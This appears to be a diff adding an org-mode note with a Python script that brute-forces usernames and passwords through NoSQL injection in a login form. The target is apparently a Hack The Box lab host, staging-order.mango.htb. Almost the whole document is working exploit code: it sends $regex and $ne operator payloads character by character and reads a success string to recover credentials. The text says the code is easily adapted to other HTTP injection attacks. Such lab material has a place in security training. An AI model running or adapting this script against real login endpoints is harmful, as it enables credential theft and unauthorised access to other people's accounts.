@@ -1,0 +1,64 @@
+#+title: Injection based brute forcer (HTTP)
+
+Below you will find a bruteforcer for HTTP based NoSQL injections. Obviously, this code is easily adjusted to any type of injection attack through HTTP.
+
+The code will start by iterating over the alphabet, digits and punctuation characters. When a username is found that starts with one of them, through ~check_username~, the rest of the username is brute forced in ~brute_username~. When completing the username, the user's password is also attacked using ~brute_password~.
+
+All characters are escaped using ~re.escape~ instead of using a blacklist. A smart builder will put regular expression characters into a bruteforcible password to make it a little harder.
+
+The ~pwntools~ library is used to provide logging and animations.
+
+#+begin_src python
+#!/usr/bin/python3
+import requests
+import string
+import re
+from pwn import *
+
+p1 = log.progress("Brute Force")
+p1.status("Brute forcing...")
+time.sleep(1)
+
+p2 = log.progress("Username")
+p3 = log.progress("Password")
+
+alfabet=string.ascii_lowercase+string.ascii_uppercase+string.digits+string.punctuation
+
+def check_username(username):
+    resp = requests.post("http://staging-order.mango.htb",
+                         data={"username[$regex]":f"^{re.escape(username)}.*",
+                               "password[$ne]":"admin",
+                               "login":"login" })
+
+    if b"Under Plantation" in resp.content:
+        return True
+    return False
+
+def brute_username(found):
+    for c in alfabet:
+        p1.status(f"Trying with the {c} character")
+        if check_username(found+c):
+            p2.status(found+c)
+            return brute_username(found+c)
+
+    passwd = brute_password(found,"")
+
+def brute_password(username,found):
+    for c in alfabet:
+        p1.status(f"Trying with the {c} character")
+        resp = requests.post("http://staging-order.mango.htb",
+                             data={"username":username,
+                                   "password[$regex]":f"^{re.escape(found)}{re.escape(c)}.*",
+                                   "login":"login" })
+
+        if b"Under Plantation" in resp.content:
+            p3.status(found+c)
+            return brute_password(username, found+c)
+    return found
+
+for c in alfabet:
+    if check_username(c):
+        brute_username(c)
+        p2 = log.progress("Username")
+        p3 = log.progress("Password")
+#+end_src
